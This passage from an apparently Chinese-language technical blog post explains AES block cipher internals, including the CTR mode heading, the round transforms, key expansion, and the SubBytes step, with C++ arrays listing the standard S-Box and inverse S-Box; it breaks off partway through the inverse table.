reset-size6 size3 mtight\"><span class=\"mbin mtight\">∗</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7386959999999999em;\"><span style=\"top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mbin mtight\">∗</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">u</span><span class=\"mclose\">)</span><span class=\"mclose\">)</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.500000000000001em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:1em;\"></span><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.5em;\"><span style=\"top:-7.5em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-6em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:8.881784197001252e-16em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:1.5000000000000009em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.000000000000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.5em;\"><span style=\"top:-7.66em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">for</span></span><span class=\"mspace\"> </span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mpunct\">;</span></span></span><span style=\"top:-6.16em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">for</span></span><span class=\"mspace\"> </span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span><span class=\"mpunct\">;</span></span></span><span style=\"top:-0.15999999999999925em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">for</span></span><span class=\"mspace\"> </span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mpunct\">;</span></span></span><span style=\"top:1.3400000000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">for</span></span><span class=\"mspace\"> </span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span><span class=\"mpunct\">;</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.000000000000001em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span></span></span></span> 是一个 block 分组的大小，这里就是 128 bit。</p>\n<h2 id=\"ctr\"><a class=\"anchor\" href=\"#ctr\">#</a> CTR</h2>\n<p>The Counter Mode</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/19/G59qAkIS3sWyZxu.png\" alt=\"\" /></p>\n<h1 id=\"aes-cipher-inverse\"><a class=\"anchor\" href=\"#aes-cipher-inverse\">#</a> AES Cipher &amp; Inverse</h1>\n<p>下图展现了实现加密和解密 AES 的过程，将每一轮每一个变换函数建立了一一对应关系。</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/19/1Gg5RhOty6fKzNi.png\" alt=\"\" /></p>\n<p>其中除了 Add 操作之外（直接异或即可），包含主要 3 对变换和反变换。另外还需要进行 Expand Key，在 AES-128 中就是将 128 bits 输入 key 计算得到规模为 128x11 bits 的 11 个 key。</p>\n<h2 id=\"subbytes-inverse\"><a class=\"anchor\" href=\"#subbytes-inverse\">#</a> SubBytes &amp; Inverse</h2>\n<p>这一变换数学上的功能是对每一个字节实现如下变换：</p>\n<ul>\n<li>\n<p>将八位字节视为有限域 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mi>F</mi><mo stretchy=\"false\">(</mo><msup><mn>2</mn><mn>8</mn></msup><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">GF(2^8)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.064108em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span> 上的元素，进行取逆</p>\n</li>\n<li>\n<p>然后进行如下仿射变换：（<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">b_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 表示一个字节从低位开始数的第 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">i+1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.74285em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span> 位）</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/21/tC8ZifFRQSvbB1A.png\" alt=\"image-20241121133756106\" /></p>\n</li>\n</ul>\n<p>从结果上来说，上述变换过程及其反变换完全可以通过查表来完成。所以对于  <code>SubBytes</code>  和  <code>InvSubBytes</code>  变换，就是分别将每一个字节经过预先计算好的 AES S-Box 和 AES Inv-S-Box 进行查表置换。</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/21/1yFmb9ohqrIYZ8l.png\" alt=\"\" /></p>\n<p>对于一个字节，有 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mn>2</mn><mn>8</mn></msup><mo>=</mo><mn>256</mn></mrow><annotation encoding=\"application/x-tex\">2^8=256</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord\">6</span></span></span></span> 种取值，所以两个 Box 的大小都是 256，内容如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">uint8_t</span> Sbox[<span class=\"number\">256</span>] = &#123;</span><br><span class=\"line\">    <span class=\"number\">0x63</span>, <span class=\"number\">0x7C</span>, <span class=\"number\">0x77</span>, <span class=\"number\">0x7B</span>, <span class=\"number\">0xF2</span>, <span class=\"number\">0x6B</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0xC5</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x01</span>, <span class=\"number\">0x67</span>, <span class=\"number\">0x2B</span>, <span class=\"number\">0xFE</span>, <span class=\"number\">0xD7</span>, <span class=\"number\">0xAB</span>, <span class=\"number\">0x76</span>,</span><br><span class=\"line\">    <span class=\"number\">0xCA</span>, <span class=\"number\">0x82</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x7D</span>, <span class=\"number\">0xFA</span>, <span class=\"number\">0x59</span>, <span class=\"number\">0x47</span>, <span class=\"number\">0xF0</span>, <span class=\"number\">0xAD</span>, <span class=\"number\">0xD4</span>, <span class=\"number\">0xA2</span>, <span class=\"number\">0xAF</span>, <span class=\"number\">0x9C</span>, <span class=\"number\">0xA4</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0xC0</span>,</span><br><span class=\"line\">    <span class=\"number\">0xB7</span>, <span class=\"number\">0xFD</span>, <span class=\"number\">0x93</span>, <span class=\"number\">0x26</span>, <span class=\"number\">0x36</span>, <span class=\"number\">0x3F</span>, <span class=\"number\">0xF7</span>, <span class=\"number\">0xCC</span>, <span class=\"number\">0x34</span>, <span class=\"number\">0xA5</span>, <span class=\"number\">0xE5</span>, <span class=\"number\">0xF1</span>, <span class=\"number\">0x71</span>, <span class=\"number\">0xD8</span>, <span class=\"number\">0x31</span>, <span class=\"number\">0x15</span>,</span><br><span class=\"line\">    <span class=\"number\">0x04</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x23</span>, <span class=\"number\">0xC3</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x96</span>, <span class=\"number\">0x05</span>, <span class=\"number\">0x9A</span>, <span class=\"number\">0x07</span>, <span class=\"number\">0x12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0xE2</span>, <span class=\"number\">0xEB</span>, <span class=\"number\">0x27</span>, <span class=\"number\">0xB2</span>, <span class=\"number\">0x75</span>,</span><br><span class=\"line\">    <span class=\"number\">0x09</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0x2C</span>, <span class=\"number\">0x1A</span>, <span class=\"number\">0x1B</span>, <span class=\"number\">0x6E</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0xA0</span>, <span class=\"number\">0x52</span>, <span class=\"number\">0x3B</span>, <span class=\"number\">0xD6</span>, <span class=\"number\">0xB3</span>, <span class=\"number\">0x29</span>, <span class=\"number\">0xE3</span>, <span class=\"number\">0x2F</span>, <span class=\"number\">0x84</span>,</span><br><span class=\"line\">    <span class=\"number\">0x53</span>, <span class=\"number\">0xD1</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0xED</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0xFC</span>, <span class=\"number\">0xB1</span>, <span class=\"number\">0x5B</span>, <span class=\"number\">0x6A</span>, <span class=\"number\">0xCB</span>, <span class=\"number\">0xBE</span>, <span class=\"number\">0x39</span>, <span class=\"number\">0x4A</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0x58</span>, <span class=\"number\">0xCF</span>,</span><br><span class=\"line\">    <span class=\"number\">0xD0</span>, <span class=\"number\">0xEF</span>, <span class=\"number\">0xAA</span>, <span class=\"number\">0xFB</span>, <span class=\"number\">0x43</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0x85</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xF9</span>, <span class=\"number\">0x02</span>, <span class=\"number\">0x7F</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0x3C</span>, <span class=\"number\">0x9F</span>, <span class=\"number\">0xA8</span>,</span><br><span class=\"line\">    <span class=\"number\">0x51</span>, <span class=\"number\">0xA3</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x8F</span>, <span class=\"number\">0x92</span>, <span class=\"number\">0x9D</span>, <span class=\"number\">0x38</span>, <span class=\"number\">0xF5</span>, <span class=\"number\">0xBC</span>, <span class=\"number\">0xB6</span>, <span class=\"number\">0xDA</span>, <span class=\"number\">0x21</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xF3</span>, <span class=\"number\">0xD2</span>,</span><br><span class=\"line\">    <span class=\"number\">0xCD</span>, <span class=\"number\">0x0C</span>, <span class=\"number\">0x13</span>, <span class=\"number\">0xEC</span>, <span class=\"number\">0x5F</span>, <span class=\"number\">0x97</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x17</span>, <span class=\"number\">0xC4</span>, <span class=\"number\">0xA7</span>, <span class=\"number\">0x7E</span>, <span class=\"number\">0x3D</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x5D</span>, <span class=\"number\">0x19</span>, <span class=\"number\">0x73</span>,</span><br><span class=\"line\">    <span class=\"number\">0x60</span>, <span class=\"number\">0x81</span>, <span class=\"number\">0x4F</span>, <span class=\"number\">0xDC</span>, <span class=\"number\">0x22</span>, <span class=\"number\">0x2A</span>, <span class=\"number\">0x90</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x46</span>, <span class=\"number\">0xEE</span>, <span class=\"number\">0xB8</span>, <span class=\"number\">0x14</span>, <span class=\"number\">0xDE</span>, <span class=\"number\">0x5E</span>, <span class=\"number\">0x0B</span>, <span class=\"number\">0xDB</span>,</span><br><span class=\"line\">    <span class=\"number\">0xE0</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x3A</span>, <span class=\"number\">0x0A</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x06</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x5C</span>, <span class=\"number\">0xC2</span>, <span class=\"number\">0xD3</span>, <span class=\"number\">0xAC</span>, <span class=\"number\">0x62</span>, <span class=\"number\">0x91</span>, <span class=\"number\">0x95</span>, <span class=\"number\">0xE4</span>, <span class=\"number\">0x79</span>,</span><br><span class=\"line\">    <span class=\"number\">0xE7</span>, <span class=\"number\">0xC8</span>, <span class=\"number\">0x37</span>, <span class=\"number\">0x6D</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0xD5</span>, <span class=\"number\">0x4E</span>, <span class=\"number\">0xA9</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x56</span>, <span class=\"number\">0xF4</span>, <span class=\"number\">0xEA</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x7A</span>, <span class=\"number\">0xAE</span>, <span class=\"number\">0x08</span>,</span><br><span class=\"line\">    <span class=\"number\">0xBA</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x25</span>, <span class=\"number\">0x2E</span>, <span class=\"number\">0x1C</span>, <span class=\"number\">0xA6</span>, <span class=\"number\">0xB4</span>, <span class=\"number\">0xC6</span>, <span class=\"number\">0xE8</span>, <span class=\"number\">0xDD</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x1F</span>, <span class=\"number\">0x4B</span>, <span class=\"number\">0xBD</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x8A</span>,</span><br><span class=\"line\">    <span class=\"number\">0x70</span>, <span class=\"number\">0x3E</span>, <span class=\"number\">0xB5</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xF6</span>, <span class=\"number\">0x0E</span>, <span class=\"number\">0x61</span>, <span class=\"number\">0x35</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0xB9</span>, <span class=\"number\">0x86</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0x1D</span>, <span class=\"number\">0x9E</span>,</span><br><span class=\"line\">    <span class=\"number\">0xE1</span>, <span class=\"number\">0xF8</span>, <span class=\"number\">0x98</span>, <span class=\"number\">0x11</span>, <span class=\"number\">0x69</span>, <span class=\"number\">0xD9</span>, <span class=\"number\">0x8E</span>, <span class=\"number\">0x94</span>, <span class=\"number\">0x9B</span>, <span class=\"number\">0x1E</span>, <span class=\"number\">0x87</span>, <span class=\"number\">0xE9</span>, <span class=\"number\">0xCE</span>, <span class=\"number\">0x55</span>, <span class=\"number\">0x28</span>, <span class=\"number\">0xDF</span>,</span><br><span class=\"line\">    <span class=\"number\">0x8C</span>, <span class=\"number\">0xA1</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0xBF</span>, <span class=\"number\">0xE6</span>, <span class=\"number\">0x42</span>, <span class=\"number\">0x68</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x99</span>, <span class=\"number\">0x2D</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0xB0</span>, <span class=\"number\">0x54</span>, <span class=\"number\">0xBB</span>, <span class=\"number\">0x16</span>,</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">uint8_t</span> InvSbox[<span class=\"number\">256</span>] = &#123;</span><br><span class=\"line\">    <span class=\"number\">0x52</span>, <span class=\"number\">0x09</span>, <span class=\"number\">0x6A</span>, <span class=\"number\">0xD5</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x36</span>, <span class=\"number\">0xA5</span>, <span class=\"number\">0x38</span>, <span class=\"number\">0xBF</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0xA3</span>, <span class=\"number\">0x9E</span>, <span class=\"number\">0x81</span>, <span class=\"number\">0xF3</span>, <span class=\"number\">0xD7</span>, <span class=\"number\">0xFB</span>,</span><br><span class=\"line\">    <span class=\"number\">0x7C</span>, <span class=\"number\">0xE3</span>, <span class=\"number\">0x39</span>, <span class=\"number\">0x82</span>, <span class=\"number\">0x9B</span>, <span class=\"number\">0x2F</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0x87</span>, <span class=\"number\">0x34</span>, <span class=\"number\">0x8E</span>, <span class=\"number\">0x43</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0xC4</span>, <span class=\"number\">0xDE</span>, <span class=\"number\">0xE9</span>, <span class=\"number\">0xCB</span>,</span><br><span class=\"line\">    <span class=\"number\">0x54</span>, <span class=\"number\">0x7B</span>, <span class=\"number\">0x94</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0xA6</span>, <span class=\"number\">0xC2</span>, <span class=\"number\">0x23</span>, <span class=\"number\">0x3D</span>, <span class=\"number\">0xEE</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0x95</span>, <span class=\"number\">0x0B</span>, <span class=\"number\">0x42</span>, <span class=\"number\">0xFA</span>, <span class=\"number\">0xC3</span>, <span class=\"number\">0x4E</span>,</span><br><span class=\"line\">    <span class=\"number\">0x08</span>, <span class=\"number\">0x2E</span>, <span class=\"number\">0xA1</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x28</span>, <span class=\"number\">0xD9</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0xB2</span>, <span class=\"number\">0x76</span>, <span class=\"number\">0x5B</span>, <span class=\"number\">0xA2</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x6D</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0xD1</span>, <span class=\"number\">0x25</span>,</span><br><span class=\"line\">    <span class=\"number\">0x72</span>, <span class=\"number\">0xF8</span>, <span class=\"number\">0xF6</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x86</span>, <span class=\"number\">0x68</span>, <span class=\"number\">0x98</span>, <span class=\"number\">0x16</span>, <span class=\"number\">0xD4</span>, <span class=\"number\">0xA4</span>, <span class=\"number\">0x5C</span>, <span class=\"number\">0xCC</span>, <span class=\"number\">0x5D</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0xB6</span>, <span class=\"number\">0x92</span>,</span><br><span class=\"line\">    <span class=\"number\">0x6C</span>, <span class=\"number\">0x70</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0xFD</span>, <span class=\"number\">0xED</span>, <span class=\"number\">0xB9</span>, <span class=\"number\">0xDA</span>, <span class=\"number\">0x5E</span>, <span class=\"number\">0x15</span>, <span class=\"number\">0x46</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0xA7</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x9D</span>, <span class=\"number\">0x84</span>,</span><br><span class=\"line\">    <span class=\"number\">0x90</span>, <span class=\"number\">0xD8</span>, <span class=\"number\">0xAB</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x8C</span>, <span class=\"number\">0xBC</span>, <span class=\"number\">0xD3</span>, <span class=\"number\">0x0A</span>, <span class=\"number\">0xF7</span>, <span class=\"number\">0xE4</span>, <span class=\"number\">0x58</span>, <span class=\"number\">0x05</span>, <span class=\"number\">0xB8</span>, <span class=\"number\">0xB3</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x06</span>,</span><br><span class=\"line\">    <span class=\"number\">0xD0</span>, <span class=\"number\">0x2C</span>, <span class=\"number\">0x1E</span>, <span class=\"number\">0x8F</span>, <span class=\"number\">0xCA</span>, <span class=\"number\">0x3F</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x02</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0xAF</span>, <span class=\"number\">0xBD</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0x01</span>, <span class=\"number\">0x13</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0x6B</span>,</span><br><span class=\"line\">    <span class=\"number\">0x3A</span>, <span class=\"number\">0x91</span>, <span class=\"number\">0x11</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x4F</span>, <span class=\"number\">0x67</span>, <span class=\"number\">0xDC</span>, <span class=\"number\">0xEA</span>, <span class=\"number\">0x97</span>, <span class=\"number\">0xF2</span>, <span class=\"number\">0xCF</span>, <span class=\"number\">0xCE</span>, <span class=\"number\">0xF0</span>, <span class=\"number\">0xB4</span>, <span class=\"number\">0xE6</span>, <span class=\"number\">0x73</span>,</span><br><span class=\"line\">    <span class=\"number\">0x96</span>, <span class=\"number\">0xAC</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x22</span>, <span class=\"number\">0xE7</span>, <span class=\"number\">0xAD</span>, <span class=\"number\">0x35</span>, <span class=\"number\">0x85</span>, <span class=\"number\">0xE2</span>, <span class=\"number\">0xF9</span>, <span class=\"number\">0x37</span>, <span class=\"number\">0xE8</span>, <span class=\"number\">0x1C</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0xDF</span>, <span class=\"number\">0x6E</span>,</span><br><span class=\"line\">    <span class=\"number\">0x47</span>, <span class=\"number\">0xF1</span>, <span class=\"number\">0x1A</span>, <span class=\"number\">0x71</span>, <span class=\"number\">0x1D</span>, <span class=\"number\">0x29</span>, <span class=\"number\">0xC5</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0xB7</span>, <span class=\"number\">0x62</span>, <span class=\"number\">0x0E</span>, <span class=\"number\">0xAA</span>, <span 